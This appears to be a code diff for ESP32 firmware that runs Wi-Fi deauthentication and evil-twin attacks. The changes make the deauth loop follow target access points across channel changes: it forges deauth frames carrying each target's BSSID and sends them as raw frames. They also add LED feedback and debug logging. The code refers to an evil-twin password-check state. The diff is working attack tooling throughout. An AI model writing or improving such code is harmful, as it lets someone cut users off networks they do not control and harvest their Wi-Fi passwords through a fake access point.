@@ -683,6 +683,16 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
     
     MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
     
+    // Log current g_selected_indices and their corresponding BSSIDs
+    MY_LOG_INFO(TAG, "Current g_selected_indices and BSSIDs:");
+    for (int i = 0; i < g_selected_count; ++i) {
+        int idx = g_selected_indices[i];
+        MY_LOG_INFO(TAG, "  g_selected_indices[%d] = %d -> BSSID: %02X:%02X:%02X:%02X:%02X:%02X, SSID: %s", 
+                   i, idx, g_scan_results[idx].bssid[0], g_scan_results[idx].bssid[1], g_scan_results[idx].bssid[2],
+                   g_scan_results[idx].bssid[3], g_scan_results[idx].bssid[4], g_scan_results[idx].bssid[5],
+                   g_scan_results[idx].ssid);
+    }
+    
     // Debug: Print all scan results
     for (int i = 0; i < scan_count; ++i) {
         MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
@@ -707,8 +717,9 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
                 target_bssids[i].last_seen = esp_timer_get_time() / 1000;
                 found = true;
                 
-                MY_LOG_INFO(TAG, "Found target BSSID %s in scan results, channel: %d", 
-                           target_bssids[i].ssid, scan_results[j].primary);
+                MY_LOG_INFO(TAG, "FOUND: Target BSSID %s (%02X:%02X:%02X:%02X:%02X:%02X) found in scan results at index %d, channel: %d", 
+                           target_bssids[i].ssid, target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
+                           target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], j, scan_results[j].primary);
                 
                 if (old_channel != target_bssids[i].channel) {
                     MY_LOG_INFO(TAG, "Channel change detected for %s: %d -> %d", 
@@ -726,18 +737,7 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
     
     if (channel_changed) {
         MY_LOG_INFO(TAG, "Channel changes detected, will resume deauth on new channels");
-        
-        // Update g_scan_results with new channel information
-        for (int i = 0; i < g_selected_count; ++i) {
-            int idx = g_selected_indices[i];
-            for (int j = 0; j < target_bssid_count; ++j) {
-                if (memcmp(g_scan_results[idx].bssid, target_bssids[j].bssid, 6) == 0) {
-                    g_scan_results[idx].primary = target_bssids[j].channel;
-                    MY_LOG_INFO(TAG, "Updated g_scan_results[%d] channel to %d", idx, target_bssids[j].channel);
-                    break;
-                }
-            }
-        }
+        MY_LOG_INFO(TAG, "Note: Using target_bssids[] directly for deauth attack to avoid index confusion");
     }
 }
 
@@ -975,12 +975,24 @@ static void deauth_attack_task(void *pvParameters) {
         if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
             MY_LOG_INFO(TAG, "Performing periodic channel check...");
             
+            // Set LED to yellow during re-scan
+            esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 255, 0); // Yellow
+            if (led_err == ESP_OK) {
+                led_strip_refresh(strip);
+            }
+            
             // Temporarily pause deauth for scanning
             esp_err_t scan_result = quick_channel_scan();
             if (scan_result == ESP_OK) {
                 MY_LOG_INFO(TAG, "Channel check completed, resuming deauth");
             } else {
                 MY_LOG_INFO(TAG, "Channel check failed, continuing with current channels");
+            }
+            
+            // Clear LED after re-scan (ignore errors if LED is in invalid state)
+            led_err = led_strip_clear(strip);
+            if (led_err == ESP_OK) {
+                led_strip_refresh(strip);
             }
         }
         
@@ -1960,7 +1972,8 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
     }
 
     //then, proceed with deauth frames on channels of the APs:
-    for (int i = 0; i < g_selected_count; ++i) {
+    // Use target_bssids[] directly to avoid index confusion after periodic re-scan
+    for (int i = 0; i < target_bssid_count; ++i) {
         if (applicationState == EVIL_TWIN_PASS_CHECK ) {
             ESP_LOGW(TAG, "Checking for password...");
             return;
@@ -1972,23 +1985,22 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             return;
         }
 
-        int idx = g_selected_indices[i];
-        wifi_ap_record_t *ap_record = &g_scan_results[idx];
+        if (!target_bssids[i].active) continue;
         
-        // Debug logging only (disabled by default to avoid UART spam)
-        ESP_LOGD(TAG, "Sending deauth to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
-                ap_record->ssid, ap_record->primary,
-                ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
-                ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
+        // Enhanced logging to debug BSSID mismatch issue
+        // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
+        //         target_bssids[i].ssid, target_bssids[i].channel,
+        //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
+        //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
         
-        vTaskDelay(pdMS_TO_TICKS(100)); // Short delay to ensure channel switch
-        esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE );
-        vTaskDelay(pdMS_TO_TICKS(100)); // Short delay to ensure channel switch
+        vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
+        esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
+        vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
         
         uint8_t deauth_frame[sizeof(deauth_frame_default)];
         memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-        memcpy(&deauth_frame[10], ap_record->bssid, 6);
-        memcpy(&deauth_frame[16], ap_record->bssid, 6);
+        memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
+        memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
         wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
     }
 
